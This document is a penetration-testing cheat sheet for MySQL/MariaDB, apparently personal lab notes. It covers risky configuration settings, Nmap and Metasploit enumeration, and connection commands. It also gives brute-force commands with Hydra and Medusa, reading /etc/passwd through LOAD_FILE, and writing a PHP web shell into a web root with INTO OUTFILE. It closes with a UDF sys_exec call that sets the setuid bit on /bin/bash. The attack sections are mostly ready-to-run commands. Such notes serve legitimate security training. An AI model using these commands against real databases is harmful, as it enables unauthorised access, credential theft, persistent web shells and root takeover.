#MySQL #MariaDB #database

## What is MySQL?
Open-source relational DBMS. Client-server model — MySQL server manages data, clients query it. Common in LAMP (Linux, Apache, MySQL, PHP) and LEMP stacks. MariaDB is a community fork. Default port **TCP 3306**.

- Sensitive data should be stored hashed or encrypted
- Look for accounts with no password set
- Debug/warning modes can leak sensitive data
- Clients vulnerable to SQL injection

---

## Configuration Files

| File | Description |
|---|---|
| `/etc/mysql/mysql.conf.d/mysqld.cnf` | Main MySQL server config (Linux) |
| `/etc/mysql/my.cnf` | Global MySQL config |
| `C:\ProgramData\MySQL\MySQL Server X.X\my.ini` | Config (Windows) |

### Dangerous Settings

| Setting | Risk |
|---|---|
| `secure_file_priv = ""` | Allows reading/writing files anywhere on the filesystem |
| `local_infile = 1` | Allows LOAD DATA LOCAL INFILE |
| `bind-address = 0.0.0.0` | MySQL exposed on all interfaces |
| User with `FILE` privilege | Can read/write OS files |
| User with `SUPER` privilege | Can change global variables |

---

## Enumeration

```bash
# Nmap scripts
nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-databases,mysql-users -sV <target>

# Brute force
nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt <target>

# Metasploit
use auxiliary/scanner/mysql/mysql_login
use auxiliary/admin/mysql/mysql_enum
use auxiliary/scanner/mysql/mysql_schemadump
```

---

## Connect / Access

```bash
# Linux (mysql client)
mysql -u <user> -p<password> -h <target>
mysql -u root -p -h 10.129.20.13

# Linux with no password (anonymous/empty)
mysql -u root --host 10.129.20.13

# sqsh
sqsh -S 10.129.20.13 -U <user> -P <pass>

# Windows
mysql -u <user> -p<password> -h <target>
```

> [!note] No space between `-p` and the password: `-pPassword123` not `-p Password123`

---

## Key SQL Commands

```sql
-- Show all databases
SHOW DATABASES;

-- Select database
USE <database>;

-- Show all tables
SHOW TABLES;

-- Show columns
SHOW COLUMNS FROM <table>;
DESCRIBE <table>;

-- Dump table
SELECT * FROM <table>;

-- Current user and privileges
SELECT user();
SELECT current_user();
SHOW GRANTS;
SHOW GRANTS FOR 'user'@'host';

-- List all users
SELECT user, host, authentication_string FROM mysql.user;

-- Check secure_file_priv setting
SHOW VARIABLES LIKE 'secure_file_priv';
SHOW VARIABLES LIKE 'local_infile';
```

---

## Attack Vectors

### Read Files (requires FILE privilege + secure_file_priv check)

```sql
-- Check if file read is allowed
SHOW VARIABLES LIKE 'secure_file_priv';
-- Empty string "" = unrestricted, NULL = disabled

-- Read a file
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');
```

### Write Files (Web Shell)

```sql
-- Write web shell (requires FILE privilege + writable web root)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

-- Write web shell (alternative)
SELECT 0x3c3f70687020...hex... INTO DUMPFILE '/var/www/html/shell.php';
```

### User-Defined Function (UDF) Privilege Escalation

```bash
# If MySQL runs as root, UDF can execute OS commands
# Use raptor_udf2.c or lib_mysqludf_sys to compile a .so
# Load it into MySQL:
```

```sql
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('chmod u+s /bin/bash');
```

### Brute Force

```bash
# Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<target>

# Medusa
medusa -h <target> -u root -P /usr/share/wordlists/rockyou.txt -M mysql
```

---

## Quick Reference

| Goal | Command |
|---|---|
| Connect (Linux) | `mysql -u user -pPass -h host` |
| All databases | `SHOW DATABASES;` |
| All users | `SELECT user,host FROM mysql.user;` |
| Check file privs | `SHOW VARIABLES LIKE 'secure_file_priv';` |
| Read file | `SELECT LOAD_FILE('/etc/passwd');` |
| Write web shell | `SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';` |
| Brute force | `hydra -l root -P rockyou.txt mysql://host` |
| Nmap enum | `nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-databases` |
